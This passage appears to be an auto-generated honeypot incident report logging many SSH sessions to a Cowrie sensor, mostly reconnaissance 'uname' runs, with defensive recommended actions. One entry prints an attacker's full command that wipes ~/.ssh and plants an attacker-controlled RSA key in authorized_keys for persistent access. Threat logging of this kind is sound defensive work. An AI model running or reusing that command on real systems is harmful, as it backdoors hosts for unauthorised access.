| `2026-07-24 15:06:00` | `cowrie.command.input` |
| `2026-07-24 15:06:00` | `cowrie.log.closed` |
| `2026-07-24 15:06:00` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.153.34[.]144` to AbuseIPDB if not already reported
- [ ] Block `45.153.34[.]144` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-730707bc64ed

| Field | Detail |
|---|---|
| **Source IP** | `45.153.34[.]144` |
| **First Seen** | 2026-07-24 15:06 |
| **Last Seen** | 2026-07-24 15:06 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 15:06:05` | `cowrie.session.connect` |
| `2026-07-24 15:06:05` | `cowrie.client.version` |
| `2026-07-24 15:06:05` | `cowrie.client.kex` |
| `2026-07-24 15:06:05` | `cowrie.login.success` |
| `2026-07-24 15:06:06` | `cowrie.session.params` |
| `2026-07-24 15:06:06` | `cowrie.command.input` |
| `2026-07-24 15:06:06` | `cowrie.log.closed` |
| `2026-07-24 15:06:06` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.153.34[.]144` to AbuseIPDB if not already reported
- [ ] Block `45.153.34[.]144` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-57ae4a845d04

| Field | Detail |
|---|---|
| **Source IP** | `45.153.34[.]144` |
| **First Seen** | 2026-07-24 15:06 |
| **Last Seen** | 2026-07-24 15:06 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 15:06:11` | `cowrie.session.connect` |
| `2026-07-24 15:06:11` | `cowrie.client.version` |
| `2026-07-24 15:06:12` | `cowrie.client.kex` |
| `2026-07-24 15:06:12` | `cowrie.login.success` |
| `2026-07-24 15:06:13` | `cowrie.session.params` |
| `2026-07-24 15:06:13` | `cowrie.command.input` |
| `2026-07-24 15:06:13` | `cowrie.log.closed` |
| `2026-07-24 15:06:13` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.153.34[.]144` to AbuseIPDB if not already reported
- [ ] Block `45.153.34[.]144` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-11223304eef6

| Field | Detail |
|---|---|
| **Source IP** | `45.153.34[.]144` |
| **First Seen** | 2026-07-24 15:06 |
| **Last Seen** | 2026-07-24 15:06 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 15:06:18` | `cowrie.session.connect` |
| `2026-07-24 15:06:18` | `cowrie.client.version` |
| `2026-07-24 15:06:18` | `cowrie.client.kex` |
| `2026-07-24 15:06:19` | `cowrie.login.success` |
| `2026-07-24 15:06:19` | `cowrie.session.params` |
| `2026-07-24 15:06:19` | `cowrie.command.input` |
| `2026-07-24 15:06:20` | `cowrie.log.closed` |
| `2026-07-24 15:06:20` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.153.34[.]144` to AbuseIPDB if not already reported
- [ ] Block `45.153.34[.]144` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a1204d561b0d

| Field | Detail |
|---|---|
| **Source IP** | `45.153.34[.]144` |
| **First Seen** | 2026-07-24 15:06 |
| **Last Seen** | 2026-07-24 15:06 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 15:06:24` | `cowrie.session.connect` |
| `2026-07-24 15:06:24` | `cowrie.client.version` |
| `2026-07-24 15:06:24` | `cowrie.client.kex` |
| `2026-07-24 15:06:25` | `cowrie.login.success` |
| `2026-07-24 15:06:25` | `cowrie.session.params` |
| `2026-07-24 15:06:25` | `cowrie.command.input` |
| `2026-07-24 15:06:26` | `cowrie.log.closed` |
| `2026-07-24 15:06:26` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.153.34[.]144` to AbuseIPDB if not already reported
- [ ] Block `45.153.34[.]144` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-01c7c24a98dd

| Field | Detail |
|---|---|
| **Source IP** | `144.225.187[.]57` |
| **First Seen** | 2026-07-24 15:06 |
| **Last Seen** | 2026-07-24 15:06 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 15:06:28` | `cowrie.session.connect` |
| `2026-07-24 15:06:28` | `cowrie.client.version` |
| `2026-07-24 15:06:28` | `cowrie.client.kex` |
| `2026-07-24 15:06:28` | `cowrie.login.success` |
| `2026-07-24 15:06:29` | `cowrie.session.params` |
| `2026-07-24 15:06:29` | `cowrie.command.input` |
| `2026-07-24 15:06:29` | `cowrie.command.failed` |
| `2026-07-24 15:06:29` | `cowrie.log.closed` |
| `2026-07-24 15:06:30` | `cowrie.session.params` |
| `2026-07-24 15:06:30` | `cowrie.command.input` |
| `2026-07-24 15:06:30` | `cowrie.session.file_download` |
| `2026-07-24 15:06:30` | `cowrie.log.closed` |
| `2026-07-24 15:06:30` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `144.225.187[.]57` to AbuseIPDB if not already reported
- [ ] Block `144.225.187[.]57` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8711aca2bda6

| Field | Detail |
|---|---|
| **Source IP** | `144.225.187[.]57` |
| **First Seen** | 2026-07-24 15:06 |
| **Last Seen** | 2026-07-24 15:06 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 15:06:30` | `cowrie.session.connect` |
| `2026-07-24 15:06:30` | `cowrie.client.version` |
| `2026-07-24 15:06:30` | `cowrie.client.kex` |
| `2026-07-24 15:06:30` | `cowrie.login.success` |
| `2026-07-24 15:06:30` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `144.225.187[.]57` to AbuseIPDB if not already reported
- [ ] Block `144.225.187[.]57` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-669bc848ea16

| Field | Detail |
|---|---|
| **Source IP** | `144.225.187[.]57` |
| **First Seen** | 2026-07-24 15:06 |
| **Last Seen** | 2026-07-24 15:06 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 15:06:30` | `cowrie.session.connect` |
| `2026-07-24 15:06:30` | `cowrie.client.version` |
| `2026-07-24 15:06:30` | `cowrie.client.kex` |
| `2026-07-24 15:06:30` | `cowrie.login.success` |
| `2026-07-24 15:06:30` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `144.225.187[.]57` to AbuseIPDB if not already reported
- [ ] Block `144.225.187[.]57` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6270646edf01

| Field | Detail |
|---|---|
| **Source IP** | `45.153.34[.]144` |
| **First Seen** | 2026-07-24 15:06 |
| **Last Seen** | 2026-07-24 15:06 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 15:06:31` | `cowrie.session.connect` |
| `2026-07-24 15:06:31` | `cowrie.client.version` |
| `2026-07-24 15:06:31` | `cowrie.client.kex` |
| `2026-07-24 15:06:31` | `cowrie.login.success` |
| `2026-07-24 15:06:32` | `cowrie.session.params` |
| `2026-07-24 15:06:32` | `cowrie.command.input` |
| `2026-07-24 15:06:32` | `cowrie.log.closed` |
| `2026-07-24 15:06:32` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.153.34[.]144` to AbuseIPDB if not already reported
- [ ] Block `45.153.34[.]144` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-758d3bdc53ff

| Field | Detail |
|---|---|
| **Source IP** | `45.153.34[.]144` |
| **First Seen** | 2026-07-24 15:06 |
| **Last Seen** | 2026-07-24 15:06 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 15:06:37` | `cowrie.session.connect` |
| `2026-07-24 15:06:37` | `cowrie.client.version` |
| `2026-07-24 15:06:37` | `cowrie.client.kex` |
| `2026-07-24 15:06:37` | `cowrie.login.success` |
| `2026-07-24 15:06:38` | `cowrie.session.params` |
| `2026-07-24 15:06:38` | `cowrie.command.input` |
| `2026-07-24 15:06:38` | `cowrie.log.closed` |
| `2026-07-24 15:06:38` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.153.34[.]144` to AbuseIPDB if not already reported
- [ ] Block `45.153.34[.]144` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4e50f3ad1f58

| Field | Detail |
|---|---|
| **Source IP** | `45.153.34[.]144` |
| **First Seen** | 2026-07-24 15:06 |
| **Last Seen** | 2026-07-24 15:06 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 15:06:43` | `cowrie.session.connect` |
| `2026-07-24 15:06:43` | `cowrie.client.version` |
| `2026-07-24 15:06:43` | `cowrie.client.kex` |
| `2026-07-24 15:06:44` | `cowrie.login.success` |
| `2026-07-24 15:06:44` | `cowrie.session.params` |
| `2026-07-24 15:06:44` | `cowrie.command.input` |
| `2026-07-24 15:06:44` | `cowrie.log.closed` |
| `2026-07-24 15:06:44` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.153.34[.]144` to AbuseIPDB if not already reported
- [ ] Block `45.153.34[.]144` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7c9a7638f5e0

| Field | Detail |
|---|---|
| **Source IP** | `45.153.34[.]144` |
| **First Seen** | 2026-07-24 15:06 |
| **Last Seen** | 2026-07-24 15:06 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 15:06:50` | `cowrie.session.connect` |
| `2026-07-24 15:06:50` | `cowrie.client.version` |
| `2026-07-24 15:06:50` | `cowrie.client.kex` |
| `2026-07-24 15:06:50` | `cowrie.login.success` |
| `2026-07-24 15:06:51` | `cowrie.session.params` |
| `2026-07-24 15:06:51` | `cowrie.command.input` |
| `2026-07-24 15:06:51` | `cowrie.log.closed` |
| `2026-07-24 15:06:51` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.153.34[.]144` to AbuseIPDB if not already reported
- [ ] Block `45.153.34[.]144` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0543c2e72027

| Field | Detail |
|---|---|
| **Source IP** | `45.153.34[.]144` |
| **First Seen** | 2026-07-24 15:06 |
| **Last Seen** | 2026-07-24 15:06 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 15:06:56` | `cowrie.session.connect` |
| `2026-07-24 15:06:56` | `cowrie.client.version` |
| `2026-07-24 15:06:56` | `cowrie.client.kex` |
| `2026-07-24 15:06:57` | `cowrie.login.success` |
| `2026-07-24 15:06:58` | `cowrie.session.params` |
| `2026-07-24 15:06:58` | `cowrie.command.input` |
| `2026-07-24 15:06:58` | `cowrie.log.closed` |
| `2026-07-24 15:06:58` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.153.34[.]144` to AbuseIPDB if not already reported
- [ ] Block `45.153.34[.]144` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9f091d3b26ba

| Field | Detail |
|---|---|
| **Source IP** | `45.153.34[.]144` |
| **First Seen** | 2026-07-24 15:07 |
| **Last Seen** | 2026-07-24 15:07 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 15:07:02` | `cowrie.session.connect` |
| `2026-07-24 15:07:02` | `cowrie.client.version` |
| `2026-07-24 15:07:03` | `cowrie.client.kex` |
| `2026-07-24 15:07:03` | `cowrie.login.success` |
| `2026-07-24 15:07:04` | `cowrie.session.params` |
| `2026-07-24 15:07:04` | `cowrie.command.input` |
| `2026-07-24 15:07:04` | `cowrie.log.closed` |
| `2026-07-24 15:07:04` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.153.34[.]144` to AbuseIPDB if not already reported
- [ ] Block `45.153.34[.]144` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-23b8bd3fc917

| Field | Detail |
|---|---|
| **Source IP** | `45.153.34[.]144` |
| **First Seen** | 2026-07-24 15:07 |
| **Last Seen** | 2026-07-24 15:07 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 15:07:08` | `cowrie.session.connect` |
| `2026-07-24 15:07:08` | `cowrie.client.version` |
| `2026-07-24 15:07:08` | `cowrie.client.kex` |
| `2026-07-24 15:07:09` | `cowrie.login.success` |
| `2026-07-24 15:07:09` | `cowrie.session.params` |
| `2026-07-24 15:07:09` | `cowrie.command.input` |
| `2026-07-24 15:07:10` | `cowrie.log.closed` |
| `2026-07-24 15:07:10` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.153.34[.]144` to AbuseIPDB if not already reported
- [ ] Block `45.153.34[.]144` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8038dc82952c

| Field | Detail |
|---|---|
| **Source IP** | `2.54.85[.]220` |
| **First Seen** | 2026-07-24 15:07 |
| **Last Seen** | 2026-07-24 15:07 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 15:07:11` | `cowrie.session.connect` |
| `2026-07-24 15:07:11` | `cowrie.client.version` |
| `2026-07-24 15:07:12` | `cowrie.client.kex` |
| `2026-07-24 15:07:13` | `cowrie.login.success` |
| `2026-07-24 15:07:13` | `cowrie.direct-tcpip.request` |
| `2026-07-24 15:07:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.54.85[.]220` to AbuseIPDB if not already reported
- [ ] Block `2.54.85[.]220` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-471411126cf4

| Field | Detail |
|---|---|
| **Source IP** | `45.153.34[.]144` |
| **First Seen** | 2026-07-24 15:07 |
| **Last Seen** | 2026-07-24 15:07 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 15:07:14` | `cowrie.session.connect` |
| `2026-07-24 15:07:14` | `cowrie.client.version` |
| `2026-07-24 15:07:14` | `cowrie.client.kex` |
| `2026-07-24 15:07:14` | `cowrie.login.success` |
| `2026-07-24 15:07:15` | `cowrie.session.params` |
| `2026-07-24 15:07:15` | `cowrie.command.input` |
| `2026-07-24 15:07:15` | `cowrie.log.closed` |
| `2026-07-24 15:07:15` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.153.34[.]144` to AbuseIPDB if not already reported
- [ ] Block `45.153.34[.]144` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-442adc288766

| Field | Detail |
|---|---|
| **Source IP** | `175.206.113[.]91` |
| **First Seen** | 2026-07-24 15:07 |
| **Last Seen** | 2026-07-24 15:07 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 15:07:18` | `cowrie.session.connect` |
| `2026-07-24 15:07:19` | `cowrie.client.version` |
| `2026-07-24 15:07:19` | `cowrie.client.kex` |
| `2026-07-24 15:07:22` | `cowrie.login.success` |
| `2026-07-24 15:07:23` | `cowrie.direct-tcpip.request` |
| `2026-07-24 15:07:27` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `175.206.113[.]91` to AbuseIPDB if not already reported
- [ ] Block `175.206.113[.]91` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1504cf1787de

| Field | Detail |
|---|---|
| **Source IP** | `45.153.34[.]144` |
| **First Seen** | 2026-07-24 15:07 |
| **Last Seen** | 2026-07-24 15:07 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 15:07:20` | `cowrie.session.connect` |
| `2026-07-24 15:07:20` | `cowrie.client.version` |
| `2026-07-24 15:07:20` | `cowrie.client.kex` |
| `2026-07-24 15:07:20` | `cowrie.login.success` |
| `2026-07-24 15:07:21` | `cowrie.session.params` |
| `2026-07-24 15:07:21` | `cowrie.command.input` |
| `2026-07-24 15:07:21` | `cowrie.log.closed` |
| `2026-07-24 15:07:21` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.153.34[.]144` to AbuseIPDB if not already reported
- [ ] Block `45.153.34[.]144` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3cb6f68be460

| Field | Detail |
|---|---|
| **Source IP** | `45.153.34[.]144` |
| **First Seen** | 2026-07-24 15:07 |
| **Last Seen** | 2026-07-24 15:07 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 15:07:25` | `cowrie.session.connect` |
| `2026-07-24 15:07:25` | `cowrie.client.version` |
| `2026-07-24 15:07:25` | `cowrie.client.kex` |
| `2026-07-24 15:07:26` | `cowrie.login.success` |
| `2026-07-24 15:07:27` | `cowrie.session.params` |
| `2026-07-24 15:07:27` | `cowrie.command.input` |
| `2026-07-24 15:07:27` | `cowrie.log.closed` |
| `2026-07-24 15:07:27` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.153.34[.]144` to AbuseIPDB if not already reported
- [ ] Block `45.153.34[.]144` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6e3320d646af

| Field | Detail |
|---|---|
| **Source IP** | `45.153.34[.]144` |
| **First Seen** | 2026-07-24 15:07 |
| **Last Seen** | 2026-07-24 15:07 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 15:07:31` | `cowrie.session.connect` |
| `2026-07-24 15:07:31` | `cowrie.client.version` |
| `2026-07-24 15:07:31` | `cowrie.client.kex` |
| `2026-07-24 15:07:31` | `cowrie.login.success` |
| `2026-07-24 15:07:32` | `cowrie.session.params` |
| `2026-07-24 15:07:32` | `cowrie.command.input` |
| `2026-07-24 15:07:32` | `cowrie.log.closed` |
| `2026-07-24 15:07:32` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.153.34[.]144` to AbuseIPDB if not already reported
- [ ] Block `45.153.34[.]144` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d24a5408f15a

| Field | Detail |
|---|---|
| **Source IP** | `45.153.34[.]144` |
| **First Seen** | 2026-07-24 15:07 |
| **Last Seen** | 2026-07-24 15:07 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 15:07:37` | `cowrie.session.connect` |
| `2026-07-24 15:07:37` | `cowrie.client.version` |
| `2026-07-24 15:07:37` | `cowrie.client.kex` |
| `2026-07-24 15:07:37` | `cowrie.login.success` |
| `2026-07-24 15:07:38` | `cowrie.session.params` |
| `2026-07-24 15:07:38` | `cowrie.command.input` |
| `2026-07-24 15:07:38` | `cowrie.log.closed` |
| `2026-07-24 15:07:38` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.153.34[.]144` to AbuseIPDB if not already reported
- [ ] Block `45.153.34[.]144` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d7f5c9c4baaa

| Field | Detail |
|---|---|
| **Source IP** | `45.153.34[.]144` |
| **First Seen** | 2026-07-24 15:07 |
| **Last Seen** | 2026-07-24 15:07 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 15:07:42` | `cowrie.session.connect` |
| `2026-07-24 15:07:43` | `cowrie.client.version` |
| `2026-07-24 15:07:43` | `cowrie.client.kex` |
| `2026-07-24 15:07:43` | `cowrie.login.success` |
| `2026-07-24 15:07:44` | `cowrie.session.params` |
| `2026-07-24 15:07:44` | `cowrie.command.input` |
| `2026-07-24 15:07:44` | `cowrie.log.closed` |
| `2026-07-24 15:07:44` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.153.34[.]144` to AbuseIPDB if not already reported
- [ ] Block `45.153.34[.]144` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-afbab07b1a92

| Field | Detail |
|---|---|
| **Source IP** | `45.153.34[.]144` |
| **First Seen** | 2026-07-24 15:07 |
| **Last Seen** | 2026-07-24 15:07 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 15:07:49` | `cowrie.session.connect` |
| `2026-07-24 15:07:49` | `cowrie.client.version` |
| `2026-07-24 15:07:49` | `cowrie.client.kex` |
| `2026-07-24 15:07:49` | `cowrie.login.success` |
| `2026-07-24 15:07:50` | `cowrie.session.params` |
| `2026-07-24 15:07:50` | `cowrie.command.input` |
| `2026-07-24 15:07:50` | `cowrie.log.closed` |
| `2026-07-24 15:07:50` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.153.34[.]144` to AbuseIPDB if not already reported
- [ ] Block `45.153.34[.]144` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-770f3e42c6d5

| Field | Detail |
|---|---|
| **Source IP** | `45.153.34[.]144` |
| **First Seen** | 2026-07-24 15:07 |
| **Last Seen** | 2026-07-24 15:07 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 15:07:55` | `cowrie.session.connect` |
| `2026-07-24 15:07:55` | `cowrie.client.version` |
| `2026-07-24 15:07:55` | `cowrie.client.kex` |
| `2026-07-24 15:07:55` | `cowrie.login.success` |
| `2026-07-24 15:07:56` | `cowrie.session.params` |
| `2026-07-24 15:07:56` | `cowrie.command.input` |
| `2026-07-24 15:07:56` | `cowrie.log.closed` |
| `2026-07-24 15:07:56` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.153.34[.]144` to AbuseIPDB if not already reported
- [ ] Block `45.153.34[.]144` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-45eb6a6914b5

| Field | Detail |
|---|---|
| **Source IP** | `45.153.34[.]144` |
| **First Seen** | 2026-07-24 15:08 |
| **Last Seen** | 2026-07-24 15:08 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 15:08:00` | `cowrie.session.connect` |
| `2026-07-24 15:08:00` | `cowrie.client.version` |
| `2026-07-24 15:08:00` | `cowrie.client.kex` |
